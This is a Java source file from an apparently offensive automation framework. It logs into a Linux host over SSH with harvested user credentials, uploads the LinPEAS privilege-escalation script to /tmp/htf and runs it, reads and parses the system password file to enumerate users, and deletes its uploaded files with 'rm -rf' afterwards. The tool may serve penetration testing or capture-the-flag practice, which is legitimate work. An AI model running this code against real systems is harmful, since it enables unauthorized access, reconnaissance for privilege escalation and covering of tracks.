package com.teto.command.ssh.linux;

import com.teto.*;
import com.teto.command.AbstractCommand;
import com.teto.command.Context;
import com.teto.domain.local.TargetNode;
import com.teto.domain.meta.Tag;
import com.teto.domain.parser.linenum.LinEnumParser;
import com.teto.domain.parser.linpeas.LinPeasParser;
import com.teto.domain.parser.linpeas.LinPeasResult;
import com.teto.domain.passwd.Passwd;
import com.teto.domain.passwd.PasswdItem;
import com.teto.domain.provenance.Provenance;
import com.teto.domain.target.Target;
import com.teto.domain.target.TargetType;
import com.teto.domain.uname.Uname;
import com.teto.domain.user.ScannedUser;
import net.schmizz.sshj.SSHClient;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Optional;

public class GatherTargetInfoUsingLinuxSSH extends AbstractCommand<Void> implements IUser, IBash, ISSHLinux, IPasswd, ITarget{
    private final TargetNode node;

    public GatherTargetInfoUsingLinuxSSH(TargetNode node) {
        this.node = node;
    }

    @Override
    public Optional<Void> apply(Context ctx) {
        Target os = getTarget(ctx, node, TargetType.OperatingSystem);
        if(os == null) {
            warn(this,"No linux operating system target found");
            return empty();
        }
        if(!isLinux(ctx, os)) {
            error(this,"You have called a linux command on a non linux target");
            return empty();
        }
        final Target target = getTarget(ctx, node, "ssh");
        if(target == null) {
            info(this,"No ssh service detected");
            return empty();
        }
        info(this, "ssh service detected...attempting password cracking etc");
        final List<ScannedUser> users = getUsersWithPasswords(ctx, node, "ssh");
        if(users == null || users.isEmpty()) {
            info(this,"No users with passwords found for ssh service");
            return empty();
        }
        try {
            for(ScannedUser user : users) {
                final SSHClient sshClient = sshClient(ctx, target, user);
                if(sshClient == null) {
                    user.setSshValid(false);
                    continue;
                }
                info(this,"Flag user "+user.getUserName()+" as valid ssh user");
                user.setSshValid(true);
                if(!uploadAndExecuteLinPeas(ctx, sshClient)) {
                    return empty();
                }
                final Passwd passwd = parseUsers(ctx, getPasswordFileContents(ctx, sshClient));
                List<ScannedUser> usrs = createUsers(ctx, os, passwd);
                info(this, "Add all system users");
                node.getScannedTargets().getUsers().addAll(usrs);

                info(this,"Clean up remote site of uploaded files etc");
                for(String dir : node.getDirectoriesCreated()) {
                    info(this,"Removing remote directory "+dir);
                    sshCommand(ctx, sshClient, "rm -rf "+dir);
                }
                sshCommand(ctx, sshClient, "rm -rf /tmp/linpeas*");

                node.getDirectoriesCreated().clear();
                sshClient.close();
            }
        } catch(Exception e) {
            error(this,"Exception caught ", e);
        }
        return Optional.empty();
    }

    private boolean uploadAndExecuteLinPeas(Context ctx, SSHClient sshClient) {
        String linPas = node.getPrivilegeEscalationScripts().get(Provenance.LinPeas);
        if(!new File(linPas).exists()) {
            boolean res = sshDirExists(ctx, sshClient, "/tmp/htf");
            if (!res) {
                res = sshCreateDirectory(ctx, sshClient, "/tmp/htf");
                if (!res) {
                    warn(this, "Failed to create remote directory /tmp/htf");
                    return false;
                }
                info(this, "Remote Directory /tmp/htf created");
            }
            node.getDirectoriesCreated().add("/tmp/htf");

            String fileName = property(ctx, Tag.LinPeas);
            res = sshFileExists(ctx, sshClient, "/tmp/htf/" + new File(fileName).getName());
            if (!res) {
                res = sshUploadFile(ctx, sshClient, fileName, "/tmp/htf");
                if (!res) {
                    warn(this, "Failed to upload file " + fileName + " to remote");
                    return res;
                }
            }

            info(this, "Uploaded file " + fileName + " to remote system");

            res = sshFileExists(ctx, sshClient, "/tmp/htf/" + new File(fileName).getName());
            if (!res) {
                warn(this, "File /tmp/htf/" + new File(fileName).getName() + " failed to upload or has been deleted");
                return res;
            }
            info(this, "File remote file /tmp/htf/" + new File(fileName).getName() + " exists");

            sshCommand(ctx, sshClient, "chmod +x /tmp/htf/" + new File(fileName).getName());

            info(this, "Executing remote file /tmp/htf/" + new File(fileName).getName());
            List<String> lines = sshCommand(ctx, sshClient, "/tmp/htf/" + new File(fileName).getName() + " -q -N");
            if (lines != null && !lines.isEmpty()) {
                info(this, "Remote file /tmp/htf/" + new File(fileName).getName() + " executed ok");
                saveFile(linPas, lines);

            } else {
                warn(this, "No output received from executing file /tmp/htf/" + new File(fileName).getName() + " ?? :(");
            }
        }
        info(this, "Parsing linpeas output");
        LinPeasParser parser = new LinPeasParser();
        LinPeasResult peas = parser.parse(ctx, linPas);
        node.setPeas(peas);
        return true;
    }
    private boolean saveFile(String fileName, Collection<String> lines) {
        StringBuilder sb = new StringBuilder();
        for(var line : lines) {
            sb.append(line).append("\n");
        }
        return saveFile(fileName, sb.toString());
    }
    private boolean saveFile(String fileName, String contents) {
        try {
            File parent = new File(fileName).getParentFile();
            if(parent != null &&  !parent.exists()) {
                parent.mkdirs();
            }
            FileUtils.writeStringToFile(new File(fileName), contents, Charset.forName("UTF-8"));
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    private void alignDetails(Target os, Uname uname) {
        os.setHardwarePlatform(uname.getHardwarePlatform());
        os.setKernalName(uname.getKernalName());
        os.setKernelVersion(uname.getKernelVersion());
        os.setMachineName(uname.getMachineName());
        os.setNodeName(uname.getNodeName());
        os.setOsName(uname.getOs());
        os.setProcessors(uname.getProcessors());
    }

    private List<ScannedUser> createUsers(Context ctx, Target os, Passwd passwd) {
        final List<ScannedUser> usrs = new ArrayList<>();
        for(PasswdItem item : passwd.getUsers()) {
            ScannedUser su = createScannedUser(ctx, item);

            su.setLevel(os.getLevel());
            su.setParentId(os.getId());
            su.setParentType(os.getTargetType());
            su.setProvenance(Provenance.SSHJ.name());
            su.setContext("os");
            usrs.add(su);
        }
        return usrs;
    }

    private ScannedUser createScannedUser(Context ctx, PasswdItem item) {
        ScannedUser su = new ScannedUser();
        su.setUserName(item.getUserName());
        su.setConfidence(100);
        su.setUid(item.getUid());
        su.setGid(item.getGid());
        su.setUserInfo(item.getUserInfo());
        su.setHomeDirectory(item.getHomeDirectory());
        su.setShell(item.getShell());

        return su;
    }
}
